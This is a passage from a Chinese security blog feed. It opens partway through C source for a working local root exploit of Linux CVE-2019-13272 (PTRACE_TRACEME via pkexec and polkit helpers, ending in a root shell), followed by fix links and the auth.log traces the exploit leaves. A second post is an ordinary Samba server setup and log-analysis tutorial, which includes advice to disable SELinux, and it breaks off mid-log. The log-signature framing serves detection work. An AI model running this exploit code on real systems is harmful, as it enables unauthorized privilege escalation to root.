class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// * * * * * * * * * * * * * * * * * Main * * * * * * * * * * * * * * * * *</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_traceme_root</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  dprintf(<span class="string">&quot;[.] Trying helper: %s\n&quot;</span>, helper_path);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * set up a pipe such that the next write to it will block: packet mode,</span></span><br><span class="line"><span class="comment">   * limited to one packet</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  SAFE(pipe2(block_pipe, O_CLOEXEC|O_DIRECT));</span><br><span class="line">  SAFE(fcntl(block_pipe[<span class="number">0</span>], F_SETPIPE_SZ, <span class="number">0x1000</span>));</span><br><span class="line">  <span class="keyword">char</span> dummy = <span class="number">0</span>;</span><br><span class="line">  SAFE(write(block_pipe[<span class="number">1</span>], &amp;dummy, <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* spawn pkexec in a child, and continue here once our child is in execve() */</span></span><br><span class="line">  dprintf(<span class="string">&quot;[.] Spawning suid process (%s) ...\n&quot;</span>, pkexec_path);</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">char</span> middle_stack[<span class="number">1024</span>*<span class="number">1024</span>];</span><br><span class="line">  <span class="keyword">pid_t</span> midpid = SAFE(clone(middle_main, middle_stack+<span class="keyword">sizeof</span>(middle_stack),</span><br><span class="line">                            CLONE_VM|CLONE_VFORK|SIGCHLD, <span class="literal">NULL</span>));</span><br><span class="line">  <span class="keyword">if</span> (!middle_success) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * wait for our child to go through both execve() calls (first pkexec, then</span></span><br><span class="line"><span class="comment">   * the executable permitted by polkit policy).</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(tprintf(<span class="string">&quot;/proc/%d/comm&quot;</span>, midpid), O_RDONLY);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">int</span> buflen = SAFE(read(fd, buf, <span class="keyword">sizeof</span>(buf)<span class="number">-1</span>));</span><br><span class="line">    buf[buflen] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    *strchrnul(buf, <span class="string">&#x27;\n&#x27;</span>) = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strncmp</span>(buf, basename(helper_path), <span class="number">15</span>) == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    usleep(<span class="number">100000</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * our child should have gone through both the privileged execve() and the</span></span><br><span class="line"><span class="comment">   * following execve() here</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  dprintf(<span class="string">&quot;[.] Tracing midpid ...\n&quot;</span>);</span><br><span class="line">  SAFE(ptrace(PTRACE_ATTACH, midpid, <span class="number">0</span>, <span class="literal">NULL</span>));</span><br><span class="line">  SAFE(waitpid(midpid, &amp;dummy_status, <span class="number">0</span>));</span><br><span class="line">  dprintf(<span class="string">&quot;[~] Attached to midpid\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  force_exec_and_wait(midpid, <span class="number">0</span>, <span class="string">&quot;stage2&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;stage2&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> middle_stage2();</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;stage3&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> spawn_shell();</span><br><span class="line"></span><br><span class="line">  dprintf(<span class="string">&quot;Linux 4.10 &lt; 5.1.17 PTRACE_TRACEME local root (CVE-2019-13272)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  check_env();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc &gt; <span class="number">1</span> &amp;&amp; <span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;check&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> ENABLE_AUTO_TARGETING</span></span><br><span class="line">  <span class="comment">/* search polkit policies for helper executables */</span></span><br><span class="line">  dprintf(<span class="string">&quot;[.] Searching policies for useful helpers ...\n&quot;</span>);</span><br><span class="line">  find_helpers();</span><br><span class="line">  <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(helpers)/<span class="keyword">sizeof</span>(helpers[<span class="number">0</span>]); i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (helpers[i] == <span class="literal">NULL</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stat(helpers[i], &amp;st) != <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    helper_path = helpers[i];</span><br><span class="line">    ptrace_traceme_root();</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> ENABLE_FALLBACK_HELPERS</span></span><br><span class="line">  <span class="comment">/* search for known helpers defined in &#x27;known_helpers&#x27; array */</span></span><br><span class="line">  dprintf(<span class="string">&quot;[.] Searching for known helpers ...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(known_helpers)/<span class="keyword">sizeof</span>(known_helpers[<span class="number">0</span>]); i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (stat(known_helpers[i], &amp;st) != <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    helper_path = known_helpers[i];</span><br><span class="line">    dprintf(<span class="string">&quot;[~] Found known helper: %s\n&quot;</span>, helper_path);</span><br><span class="line">    ptrace_traceme_root();</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  dprintf(<span class="string">&quot;[~] Done\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p><a href="https://github.com/torvalds/linux/commit/6994eefb0053799d2e07cd140df6c2ea106c41ee">https://github.com/torvalds/linux/commit/6994eefb0053799d2e07cd140df6c2ea106c41ee</a></p><p><a href="https://vulmon.com/vulnerabilitydetails?qid=CVE-2019-13272">https://vulmon.com/vulnerabilitydetails?qid=CVE-2019-13272</a></p><h2 id="日志特征"><a href="#日志特征" class="headerlink" title="日志特征"></a>日志特征</h2><p><code>/var/log/auth.log</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Sep 12 23:47:31 ubuntu pkexec: pam_unix(polkit-1:session): session opened for user test by (uid=0)</span><br><span class="line">Sep 12 23:47:31 ubuntu pkexec: pam_systemd(polkit-1:session): Cannot create session: Already running in a session</span><br><span class="line">Sep 12 23:47:31 ubuntu pkexec[8588]: test: Executing command [USER=test] [TTY=unknown] [CWD=/home/test/kernel-exploits/CVE-2019-13272] [COMMAND=/usr/lib/unity-settings-daemon/usd-backlight-helper --help]</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210913145116030.png" alt="image-20210913145116030"></p>]]></content>
      
      
      <categories>
          
          <category> 主机安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日志分析 </tag>
            
            <tag> linux提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Samba服务器</title>
      <link href="/p/9eb93f46.html"/>
      <url>/p/9eb93f46.html</url>
      
        <content type="html"><![CDATA[<p>Samba是一个能让Linux系统应用Microsoft网络通讯协议的软件，而SMB是<strong>Server Message Block</strong>的缩写，即为服务器消息块 ，SMB主要是作为Microsoft的网络通讯协议，后来Samba将SMB通信协议应用到了Linux系统上，就形成了现在的Samba软件。后来微软又把 SMB 改名为 CIFS（Common Internet File System），即公共 Internet 文件系统，较多的用在了Linux与windows之间的数据共享上面。</p><h2 id="常见应用"><a href="#常见应用" class="headerlink" title="常见应用"></a>常见应用</h2><ul><li>分享档案与打印机服务；</li><li>可以提供用户登入 SAMBA 主机时的身份认证，以提供不同身份者的个别数据；</li><li>可以进行 Windows 网络上的主机名解析 (NetBIOS name)</li><li>可以进行装置的分享 (例如 Zip, CDROM…)</li></ul><h2 id="Samba使用的-damons："><a href="#Samba使用的-damons：" class="headerlink" title="Samba使用的 damons："></a>Samba使用的 damons：</h2><p><strong>NetBIOS 机器间的沟通</strong></p><ul><li>取得对方主机的NetBIOS name 定位该主机所在：</li><li>利用对方给予权限存取可用资源</li></ul><p><strong>SAMBA 使用下面两个服务来控制上面两步骤</strong>，分别是：</p><ul><li>nmbd<ul><li>这个daemon是用来管理工作组，NetBIOS name等等的解析。</li><li>主要利用 UDP 协议开启 port 137 138 来负责名称解析的任务。</li></ul></li><li>smbd<ul><li>这个daemon主要用来管理SAMBA主机分享的目录，档案与打印机等等。</li><li>主要利用可靠的TCP协议来传输数据，开放端口为139.</li></ul></li></ul><p>所以SAMBA每次启动至少都需要有这个daemon，而当我启动了SAMBA之后，主机系统就会<strong>启动137,138 这两个UDP 及139这个TCP</strong>端口。</p><h2 id="Samba联机方式"><a href="#Samba联机方式" class="headerlink" title="Samba联机方式"></a>Samba联机方式</h2><h3 id="peer-peer-对等模式"><a href="#peer-peer-对等模式" class="headerlink" title="peer/peer(对等模式)"></a>peer/peer(对等模式)</h3><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/model_peer.gif" alt="peer/peer 联机的示意图"></p><p>优点：每部计算机均可以独立运作，而不受他人的影响</p><p>缺点：当整个网域内的所有人员都要进行数据分享时，需知道所有计算机里面的账号与密码。</p><p>比较适合</p><ol><li>小型的网域</li><li>没有需要常常进行档案数据分享的网络环境</li><li>每个使用者都独自拥有该计算机的拥有权(该计算机是用户的，而不是公用的！)</li></ol><h3 id="domain-model（主控模式）"><a href="#domain-model（主控模式）" class="headerlink" title="domain model（主控模式）"></a>domain model（主控模式）</h3><p>将所有的账号与密码都放置在一部主控计算机 (Primary Domain Controller, PDC) 上面，在我的网域里面，任何人想要使用任何计算机时，都需要在屏幕前方输入账号与密码，然后通通藉由 PDC 服务器的辨识后，才给予适当的权限。也就是说，不同的身份还具有不一样的计算机资源权限。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/model_domain.gif" alt="domain model 联机的示意图"></p><h2 id="Samba服务器搭建"><a href="#Samba服务器搭建" class="headerlink" title="Samba服务器搭建"></a>Samba服务器搭建</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yum -y install samba*</span><br><span class="line">systemctl start smb</span><br><span class="line">systemctl enable smb</span><br><span class="line">firewall-cmd --permanent --add-service=samba</span><br><span class="line">getenforce ##可以显示当前SELinux的应用模式，是强制、执行还是停用</span><br><span class="line"><span class="meta">#</span><span class="bash">Permissive</span></span><br></pre></td></tr></table></figure><blockquote><p>这里的getenforce结果一定要是Permissive 不然<code>selinux</code>可能会阻止了进程</p><p><code>setenforce 0</code> 临时关闭</p><p><code>vim /etc/sysconfig/selinux</code> 永久关闭</p><p><code>\#SELINUX=enforcing</code> </p><p><code>SELINUX=disabled</code></p></blockquote><h3 id="Samba软件"><a href="#Samba软件" class="headerlink" title="Samba软件"></a>Samba软件</h3><p><code>samba-common</code>主要提供samba服务器的设置文件与设置文件语法检验程序testparm</p><p><code>samba-client</code>客户端软件，主要提供linux主机作为客户端时，所需要的工具指令集</p><p><code>samba-swat</code>基于https协议的samba服务器web配置界面</p><p><code>samba</code>服务器端软件，主要提供samba服务器的守护程序，共享文档，日志的轮替，开机默认选项Samba服务器安装完毕，会生成配置文件目录<code>/etc/samba</code>和其它一些samba可执行命令工具，<code>/etc/samba/smb.conf</code>是samba的核心配置文件。</p><h3 id="Samba服务的配置文件"><a href="#Samba服务的配置文件" class="headerlink" title="Samba服务的配置文件"></a>Samba服务的配置文件</h3><p><code>/etc/samba/smb.conf</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">[global] #全局参数</span><br><span class="line">        workgroup = SAMBA#定义工作组</span><br><span class="line">        security = user#安装验证方式，共4种user、share、server、domain</span><br><span class="line"></span><br><span class="line">        passdb backend = tdbsam#定义用户后台类型，总共有3种smbpasswd、tdbsam、ldapsam</span><br><span class="line"></span><br><span class="line">        printing = cups#设置在Samba服务启动时是否共享打印机设备</span><br><span class="line">        printcap name = cups</span><br><span class="line">        load printers = yes</span><br><span class="line">        cups options = raw#打印机的选项</span><br><span class="line">        </span><br><span class="line">        server string = Samba Server Version %v #服务器提示字符，默认显示samba版本</span><br><span class="line">        log file = /var/log/samba/log.%m #定义日志文件</span><br><span class="line"></span><br><span class="line">[homes]</span><br><span class="line">        comment = Home Directories#描述信息</span><br><span class="line">        valid users = %S, %D%w%S#有效访问用户</span><br><span class="line">        browseable = No#指定共享目录是否可以被浏览</span><br><span class="line">        read only = No#是否只读</span><br><span class="line">        inherit acls = Yes</span><br><span class="line"></span><br><span class="line">[printers]</span><br><span class="line">        comment = All Printers</span><br><span class="line">        path = /var/tmp#共享文件的实际路径。</span><br><span class="line">        printable = Yes</span><br><span class="line">        create mask = 0600</span><br><span class="line">        browseable = No</span><br><span class="line"></span><br><span class="line">[print$]</span><br><span class="line">        comment = Printer Drivers</span><br><span class="line">        path = /var/lib/samba/drivers</span><br><span class="line">        write list = @printadmin root</span><br><span class="line">        force group = @printadmin</span><br><span class="line">        create mask = 0664</span><br><span class="line">        directory mask = 0775</span><br><span class="line">        </span><br><span class="line">[common]       #共享名称为common</span><br><span class="line">    comment = Common share</span><br><span class="line">    path = /common        #指定共享目录</span><br><span class="line">    valid users = tom jerry    #有效账户列表</span><br><span class="line">    create mask = 0750        #客户端上传文件的默认权限</span><br><span class="line">    directorymask = 0775       #客户端创建目录的默认权限 </span><br><span class="line">    browseable = yes       #客户端是否对所有人可见    </span><br><span class="line">    writable= no          #是否允许写入</span><br><span class="line">    write list = tom       #写权限账户列表</span><br><span class="line">    admin users = tom       #该共享的管理员，具有完全权限</span><br><span class="line">    invalid users = root bin    #禁止root与bin访问common共享</span><br><span class="line">    guest ok = no       #是否允许匿名访问</span><br></pre></td></tr></table></figure><h4 id="主要配置参数-global"><a href="#主要配置参数-global" class="headerlink" title="主要配置参数-[global]"></a>主要配置参数-[global]</h4><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>workgroup = WORKGROUP</td><td>设定Samba Server所要加入的工作组或域</td></tr><tr><td>server string = Samba Server Version %v</td><td>设定 Samba Server 的注释，%v表示显示Samba的版本号</td></tr><tr><td>netbios name = smbserver</td><td>设置Samba Server的NetBIOS名称</td></tr><tr><td>interfaces = lo eth0 192.168.12.2/24 192.168.13.2/24</td><td>说明：设置Samba Server监听哪些网卡，可以写网卡名，也可以写该网卡的IP地址。</td></tr><tr><td>hosts allow = 127. 192.168.1. 192.168.10.1</td><td>表示允许连接到Samba Server的客户端，多个参数以空格隔开，hosts deny 与hosts allow 刚好相反。</td></tr><tr><td>hosts allow=@example.com</td><td>表示允许来自example.com网域的所有计算机连接</td></tr><tr><td>hosts allow=172.17.2.EXCEPT172.17.2.50</td><td>表示容许来自172.17.2.*的主机连接，但排除172.17.2.50</td></tr><tr><td>max connections = 0</td><td>max connections用来指定连接Samba Server的最大连接数目。如果超出连接数目，则新的连接请求将被拒绝。0表示不限制</td></tr><tr><td><strong>log file = /var/log/samba/log.%m</strong></td><td>设置Samba Server日志文件的存储位置以及日志文件名称。在文件名后加个<code>%m</code>（主机名），表示对每台访问Samba Server的机器都单独记录一个日志文件。</td></tr><tr><td>max log size = 50</td><td>设置Samba Server日志文件的最大容量，单位为kB，0代表不限制</td></tr><tr><td><strong>encrypt passwords = yes/no</strong></td><td>是否将认证密码加密</td></tr><tr><td>smb passwd file = /etc/samba/smbpasswd</td><td>如果之前设置的是smbpasswd模式的话</td></tr><tr><td><strong>username map = /etc/samba/smbusers</strong></td><td>用来定义用户名映射，比如可以将root换成administrator、admin等。不过要事先在smbusers文件中定义好。比如：root = administrator admin，这样就可以用administrator或admin这两个用户来代替root登陆Samba Server，更贴近windows用户的习惯。</td></tr><tr><td><strong>guest account = nobody</strong></td><td>用来设置guest用户名。</td></tr><tr><td><strong>load printers = yes/no</strong></td><td>设置是否在启动Samba时就共享打印机。</td></tr><tr><td><strong>printcap name = cups</strong></td><td>设置共享打印机的配置文件。</td></tr><tr><td><strong>printing = cups</strong></td><td>设置Samba共享打印机的类型</td></tr></tbody></table><p><strong>security = user</strong></p><ul><li><code>share</code>不需要提供用户名和口令</li><li><code>user</code>共享目录只能被授权的用户访问，密码要在本Samba Server中建立</li><li><code>server</code>依靠其他Windows NT/2000或Samba Server来验证用户的账号和密码,是一种代理验证。</li><li><code>domain</code>域安全级别,使用主域控制器(PDC)来完成认证</li></ul><p><strong>passdb backend = tdbsam</strong></p><p><code>passdb backend</code>表示用户后台，有三种后台：<code>smbpasswd</code>、<code>tdbsam</code>和<code>ldapsam</code></p><p><code>sam</code>表示<code>security account manager</code>（安全账户管理）</p><p><code>smbpasswd</code>：该方式是使用smb自己的工具smbpasswd来给系统用户（真实用户或者虚拟用户）设置一个Samba密码，客户端就用这个密码来访问Samba的资源。smbpasswd文件默认在<code>/etc/samba</code>目录下，不过有时候要手工建立该文件。</p><p><code>tdbsam</code>：该方式则是使用一个数据库文件来建立用户数据库。数据库文件<code>/etc/samba/passdb.tdb</code>。要建立的<strong>Samba用户必须先是系统用户</strong>。我们也可以使用pdbedit命令来建立Samba账户。</p><p>创建删除Samba账户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pdbedit –a username#创建</span><br><span class="line">pdbedit –x username</span><br></pre></td></tr></table></figure><p>列出Samba用户列表，读取passdb.tdb数据库文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pdbedit –L</span><br></pre></td></tr></table></figure><p>列出Samba用户列表的详细信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pdbedit -Lv</span><br></pre></td></tr></table></figure><p>暂停该Samba用户的账号</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pdbedit -c &quot;[]&quot; -u u</span><br></pre></td></tr></table></figure><p>恢复该Samba用户的账号</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pdbedit –c &quot;[]&quot; –u username</span><br></pre></td></tr></table></figure><p><code>ldapsam</code>该方式则是基于LDAP的账户管理方式来验证用户。首先要建立LDAP服务，然后设置<code>passdb backend = ldapsam:ldap://LDAP Server</code></p><h4 id="主要配置参数-Share"><a href="#主要配置参数-Share" class="headerlink" title="主要配置参数-[Share]"></a>主要配置参数-[Share]</h4><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><strong>comment = 任意字符串</strong></td><td>comment是对该共享的描述</td></tr><tr><td><strong>path = 共享目录路径</strong></td><td><code>/home/share/</code>下为每个Linux用户以他的用户名建个目录，作为他的共享目录，这样path就可以写成：<code>path = /home/share/%u</code></td></tr><tr><td><code>path= /home/share/%m</code></td><td>为网络上每台可以访问samba的机器都各自建个以它的netbios名的路径</td></tr><tr><td><strong>browseable = yes/no</strong></td><td>指定该共享是否可以浏览</td></tr><tr><td><strong>writable = yes/no</strong></td><td>该共享路径是否可写</td></tr><tr><td><strong>available = yes/no</strong></td><td>指定该共享资源是否可用</td></tr><tr><td><strong>admin users = 该共享的管理者</strong></td><td><code>admin users =david，sandy</code>（多个用户中间用逗号隔开）</td></tr><tr><td><strong>valid users =</strong></td><td><strong>允许访问该共享的用户</strong></td></tr><tr><td><strong>invalid users =</strong></td><td><strong>禁止访问该共享的用户</strong></td></tr><tr><td><strong>write list =</strong></td><td><strong>允许写入该共享的用户</strong></td></tr></tbody></table><h2 id="创建共享目录"><a href="#创建共享目录" class="headerlink" title="创建共享目录"></a>创建共享目录</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">useradd -s /sbin/nologin testuserh</span><br><span class="line">useradd -s /sbin/nologin testuserl</span><br><span class="line">pdbedit -a testuserh</span><br><span class="line">pdbedit -a testuserl</span><br><span class="line">pdbedit -L</span><br><span class="line">mkdir /common</span><br><span class="line">echo &quot;hello world!&quot; &gt; /common/test.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">        path = /common</span><br><span class="line">        public = yes</span><br><span class="line">        browseable = yes</span><br><span class="line">        write list = testuserh</span><br></pre></td></tr></table></figure><h2 id="linux挂载smb共享目录"><a href="#linux挂载smb共享目录" class="headerlink" title="linux挂载smb共享目录"></a>linux挂载smb共享目录</h2><p>安装：<code>yum -y install samba-client cifs-utils</code></p><p>匿名查看smb服务器共享的目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //192.168.77.199 -N</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210910161807563.png" alt="image-20210910161807563"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //192.168.201.147/common -U testuserh</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210911181952978.png" alt="image-20210911181952978"></p><h2 id="NT-STATUS-ACCESS-DENIED-opening-remote-file-xxx-exe"><a href="#NT-STATUS-ACCESS-DENIED-opening-remote-file-xxx-exe" class="headerlink" title="NT_STATUS_ACCESS_DENIED opening remote file \xxx.exe"></a>NT_STATUS_ACCESS_DENIED opening remote file \xxx.exe</h2><mark class="hl-label pink">重要！！！</mark>  要想使用户可以上传和删除文件，除了系统当中的定义的允许写操作外，目录文件系统也要有写权限才可以<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">setfacl -m u:testuserh:rwx /common</span><br><span class="line">[root@localhost ~]# getfacl /common/</span><br><span class="line">getfacl: Removing leading &#x27;/&#x27; from absolute path names</span><br><span class="line"><span class="meta">#</span><span class="bash"> file: common/</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> owner: root</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> group: root</span></span><br><span class="line">user::rwx</span><br><span class="line">user:testuserh:rwx</span><br><span class="line">group::r-x</span><br><span class="line">mask::rwx</span><br><span class="line">other::r-x</span><br><span class="line">netstat –na |grep ESTABLISHED</span><br></pre></td></tr></table></figure><h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a><a href="https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html#LOGLEVEL">配置</a></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Default: log level = 0</span><br><span class="line"></span><br><span class="line">Example: log level = 3 passdb:5 auth:10 winbind:2</span><br><span class="line"></span><br><span class="line">Example: log level = 1 full_audit:1@/var/log/audit.log winbind:2</span><br><span class="line"></span><br><span class="line">log level = 1 auth:3 #以下参考这个配置</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">all。该参数是可选的：如果您不指定额外的关键字，假定使用 all。</span><br><span class="line">tdb。与不重要的数据库相关的日志消息，这是 Samba 使用的键值存储。</span><br><span class="line">printdrivers。打印机驱动程序管理例程。</span><br><span class="line">lanman。 NT LAN Manager 调试。</span><br><span class="line">smb。 SMB 协议调试。</span><br><span class="line">rpc_parse。远程过程调用（RPCs）解析。</span><br><span class="line">rpc_srv。服务器端 RPCs。</span><br><span class="line">rpc_cli。客户端 RPCs。</span><br><span class="line">passdb。在 Samba 主机上存储密码的旧有方式。</span><br><span class="line">sam。本地 Samba 帐户数据库。</span><br><span class="line">auth。Samba 内与用户身份验证相关的各个模块。</span><br><span class="line">winbind。用于允许Microsoft用户透明地登录到UNIX系统的组件。</span><br><span class="line">vfs。为 Virtual File System 模块调试消息，允许您通过可插入模块添加功能到Samba。</span><br><span class="line">idmap。在UNIX 用户IDs与Microsoft安全标识符之间映射身份。</span><br><span class="line">quota。与配额处理相关的消息，同时由Microsoft Windows NT策略和UNIX文件系统处理。</span><br><span class="line">acls。访问控制列表处理。</span><br><span class="line">locking。文件锁定状态和错误。</span><br><span class="line">msdfs。与 Samba 的分布式文件系统支持相关的日志消息。</span><br><span class="line">dmapi。数据管理应用程序编程接口（API）功能。必须使用第三方DMAPI实现编译Samba来使用该功能。</span><br><span class="line">registry。Windows 注册表的模仿。</span><br></pre></td></tr></table></figure><p>成功登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[2021/09/11 03:58:39.242932,  2] ../../source3/auth/auth.c:329(auth_check_ntlm_password)</span><br><span class="line">  check_ntlm_password:  authentication for user [testuserh] -&gt; [testuserh] -&gt; [testuserh] succeeded</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210911190147619.png" alt="image-20210911190147619"></p><p>失败登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[2021/09/11 04:05:06.906891,  3] ../../auth/gensec/spnego.c:1445(gensec_spnego_server_negTokenTarg_step)</span><br><span 